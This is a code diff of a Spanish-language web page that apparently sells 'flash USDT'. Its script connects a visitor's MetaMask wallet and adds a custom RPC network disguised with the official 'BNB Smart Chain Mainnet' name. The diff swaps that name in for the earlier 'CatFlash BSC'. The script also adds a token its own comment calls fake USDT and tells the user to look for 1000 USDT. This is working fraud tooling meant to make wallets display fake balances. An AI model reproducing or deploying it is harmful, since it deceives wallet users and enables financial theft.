@@ -2,63 +2,58 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>USDT 💸 con LinkUpAgency</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
-      background-color: #000;
-      color: #fff;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #0f172a;
+      color: white;
+      font-family: Arial, sans-serif;
       text-align: center;
-      padding: 3rem;
+      padding: 40px 20px;
     }
     h1 {
-      margin-bottom: 2rem;
+      font-size: 2em;
+      margin-bottom: 40px;
     }
     button {
-      padding: 1rem 2rem;
-      font-size: 1.2rem;
+      background-color: #22c55e;
+      color: white;
       border: none;
+      padding: 14px 28px;
+      font-size: 16px;
       border-radius: 8px;
       cursor: pointer;
-      margin: 0.5rem;
-      color: white;
-      transition: background-color 0.3s ease;
+      margin: 10px;
     }
-    .connectBtn {
-      background-color: #3b82f6;
-    }
-    .connectBtn:hover {
-      background-color: #2563eb;
-    }
-    .instagramBtn {
-      background-color: #10b981;
-    }
-    .instagramBtn:hover {
-      background-color: #059669;
+    button:hover {
+      background-color: #16a34a;
     }
   </style>
 </head>
 <body>
   <h1>USDT 💸 con LinkUpAgency</h1>
-  <button class="connectBtn" id="connectBtn">Conectar MetaMask</button>
-  <button class="instagramBtn" id="instagramBtn">Contactar o Comprar con LinkUp 🔗</button>
+
+  <button onclick="connect()">Connect MetaMask</button><br/>
+  <button onclick="window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1', '_blank')">Contactar o Comprar con LinkUp 🔗</button>
 
   <script>
-    const connectBtn = document.getElementById('connectBtn');
-    const instagramBtn = document.getElementById('instagramBtn');
+    async function connect() {
+      if (!window.ethereum) {
+        alert("Por favor instala MetaMask.");
+        return;
+      }
 
-    instagramBtn.addEventListener('click', () => {
-      window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1', '_blank');
-    });
-
-    async function addNetwork() {
       try {
+        // Conectar cuenta
+        await ethereum.request({ method: 'eth_requestAccounts' });
+
+        // Agregar red BNB Smart Chain de Catflash
         await ethereum.request({
           method: 'wallet_addEthereumChain',
           params: [{
-            chainId: '0x38', // 56 decimal, BSC mainnet (RPC Catflash usa esta red)
-            chainName: 'CatFlash BSC',
+            chainId: '0x38',
+            chainName: 'BNB Smart Chain Mainnet',
             rpcUrls: ['https://dataseed-binance.catflash.cat/'],
             nativeCurrency: {
               name: 'BNB',
@@ -68,54 +63,27 @@
             blockExplorerUrls: ['https://bscscan.com']
           }]
         });
-      } catch (err) {
-        if (err.code !== 4001) { // 4001 es "rechazo usuario"
-          console.error('Error añadiendo red:', err);
-        }
-      }
-    }
 
-    async function addToken() {
-      try {
-        const wasAdded = await ethereum.request({
+        // Agregar token USDT falso
+        await ethereum.request({
           method: 'wallet_watchAsset',
           params: {
             type: 'ERC20',
             options: {
-              address: '0xdAC17F958D2ee523a2206206994597C13D831ec7', // contrato USDT
+              address: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
               symbol: 'USDT',
               decimals: 6,
-              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png',
+              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png?v=032'
             }
           }
         });
-        if (!wasAdded) {
-          alert('No se pudo añadir el token USDT');
-        }
-      } catch (error) {
-        console.error('Error añadiendo token:', error);
+
+        alert("✅ Conectado, red y token añadidos. Abre MetaMask para ver los 1000 USDT.");
+      } catch (err) {
+        console.error(err);
+        alert("❌ Error al conectar MetaMask o añadir red/token.");
       }
     }
-
-    connectBtn.addEventListener('click', async () => {
-      if (typeof window.ethereum === 'undefined') {
-        alert('Por favor instala MetaMask para continuar.');
-        return;
-      }
-      try {
-        await ethereum.request({ method: 'eth_requestAccounts' });
-        await addNetwork();
-        await addToken();
-        alert('✅ Conectado a MetaMask y token añadido.');
-      } catch (err) {
-        if (err.code === 4001) {
-          alert('Has rechazado la conexión.');
-        } else {
-          alert('Error al conectar MetaMask o añadir red/token.');
-          console.error(err);
-        }
-      }
-    });
   </script>
 </body>
 </html>
